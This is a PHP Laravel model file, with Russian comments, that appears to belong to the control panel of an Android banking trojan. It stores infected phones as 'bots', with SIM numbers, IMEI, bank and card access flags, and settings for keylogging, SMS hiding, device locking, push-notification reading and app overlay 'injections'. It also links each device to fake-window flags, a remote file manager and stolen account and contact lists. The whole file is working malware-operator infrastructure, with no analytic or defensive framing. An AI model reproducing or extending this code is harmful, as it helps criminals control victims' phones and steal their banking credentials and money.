<?php

namespace App\Models;

use Database\Factories\BotFactory;
use Eloquent;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Collection;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Database\Eloquent\Relations\HasManyThrough;
use Illuminate\Support\Carbon;
use Illuminate\Support\Str;

/**
 * App\Models\Bot
 *
 * @property string $id
 * @property string $ip ip адрес устройства. С портом
 * @property string|null $last_connection Дата подключения устройства.
 * @property string|null $country Название страны устройства.
 * @property string|null $country_code Код страны устройства.
 * @property string|null $tag Тег.
 * @property int $update_settings Флаг для обновления настроек бота.
 * @property int $working_time Время работы устройства в секундах.
 * @property array|null $sim_data JSON массив с информацией о сим-картах устройства. Формат: [{operator:"MTS",phone_number:"88005553535"},{operator:"MTS",phone_number:"88005553536"}]
 * @property array|null $metadata JSON массив с метаданными устройства. Формат: {android:"10",model:"Samsung Galaxy S 100","battery_level":15,"IMEI":14}
 * @property array|null $permissions JSON массив привилегий устройства. Формат: {accessibility:true,protect:true,screen:true,sms:true,cards:true,banks:true,mails:true,download_module:true,admin:true}
 * @property array $settings JSON массив с настройками. Формат: {"hideSMS":true,"lockDevice":true,"offSound":true,"keylogger":true,"clearPush":true,"readPush":true,"activeInjection":true}
 * @property int $set_windows_fake
 * @property int $set_hide_sms_list
 * @property int $set_contact_list
 * @property int $set_accounts
 * @property Carbon|null $created_at
 * @property Carbon|null $updated_at
 * @property string|null $comment
 * @property array|null $location
 * @property-read Collection|BotInjection[] $applications
 * @property-read int|null $applications_count
 * @property-read Collection|Injection[] $injections
 * @property-read int|null $injections_count
 * @property-read Collection|BotLog[] $logs
 * @property-read int|null $logs_count
 * @method static BotFactory factory(...$parameters)
 * @method static Builder|Bot newModelQuery()
 * @method static Builder|Bot newQuery()
 * @method static Builder|Bot query()
 * @method static Builder|Bot whereCountry($value)
 * @method static Builder|Bot whereCountryCode($value)
 * @method static Builder|Bot whereCreatedAt($value)
 * @method static Builder|Bot whereId($value)
 * @method static Builder|Bot whereIp($value)
 * @method static Builder|Bot whereLastConnection($value)
 * @method static Builder|Bot whereMetadata($value)
 * @method static Builder|Bot wherePermissions($value)
 * @method static Builder|Bot whereSetAccounts($value)
 * @method static Builder|Bot whereSetContactList($value)
 * @method static Builder|Bot whereSetHideSmsList($value)
 * @method static Builder|Bot whereSetWindowsFake($value)
 * @method static Builder|Bot whereSettings($value)
 * @method static Builder|Bot whereSimData($value)
 * @method static Builder|Bot whereTag($value)
 * @method static Builder|Bot whereUpdateSettings($value)
 * @method static Builder|Bot whereUpdatedAt($value)
 * @method static Builder|Bot whereWorkingTime($value)
 * @property array|null $sub_info JSON массив с дополнительной информацией об устройстве. Формат:
 *                     {
 *                         "admin": "false",
 *                         "screen": "true",
 *                         "protect": "0",
 *                         "isDozeMode": "true",
 *                         "batteryLevel": "98",
 *                         "accessibility": "true",
 *                         "isKeyguardLocked": "false"
 *                     }
 * @property int $is_favorite
 * @property int $is_blacklisted
 * @property bool $is_new
 * @property string|null $current_file_manager_path
 * @property-read int|null $bot_injections_count
 * @property-read int|null $user_timestamps_count
 * @method static Builder|Bot whereComment($value)
 * @method static Builder|Bot whereCurrentFileManagerPath($value)
 * @method static Builder|Bot whereIsBlacklisted($value)
 * @method static Builder|Bot whereIsFavorite($value)
 * @method static Builder|Bot whereIsNew($value)
 * @method static Builder|Bot whereLocation($value)
 * @method static Builder|Bot whereSubInfo($value)
 * @property-read Collection<int, BotInjection> $botInjections
 * @property-read Collection<int, UserBotTimestamp> $userTimestamps
 * @mixin Eloquent
 */
class Bot extends Model
{
    use HasFactory;

    protected $casts = [
        "sim_data" => "array",
        "metadata" => "array",
        "permissions" => "array",
        "sub_info" => "array",
        "settings" => "array",
        "created_at" => "datetime:Y-m-d H:i:s",
        "updated_at" => "datetime:Y-m-d H:i:s",
        "last_connection" => "datetime:Y-m-d H:i:s",
        "is_new" => "boolean",
        "location" => "array",
    ];

    protected $fillable = [
        "id",
        "sub_info",
        "last_connection",
        "is_favorite",
        "is_blacklisted",
        "settings",
        "update_settings",
        "comment",
        "is_new",
        "current_file_manager_path",
    ];

    public $timestamps = false;

    protected static function boot(): void
    {
        parent::boot();
        static::creating(function ($bot) {
            $bot->{$bot->getKeyName()} = (string)Str::uuid();
        });
    }

    public function getIncrementing(): bool
    {
        return false;
    }

    public function getKeyType(): string
    {
        return "string";
    }

    public function applications(): HasMany
    {
        return $this->hasMany(BotInjection::class);
    }

    public function injections(): HasManyThrough
    {
        return $this->hasManyThrough(Injection::class, BotInjection::class, "bot_id", "application", secondLocalKey: "application");
    }

    public function botInjections(): HasMany
    {
        return $this->hasMany(BotInjection::class, "bot_id", "id");
    }

    public function logs(): HasMany
    {
        return $this->hasMany(BotLog::class);
    }

    public function userTimestamps(): HasMany
    {
        return $this->hasMany(UserBotTimestamp::class, "bot_id", "id");
    }
}
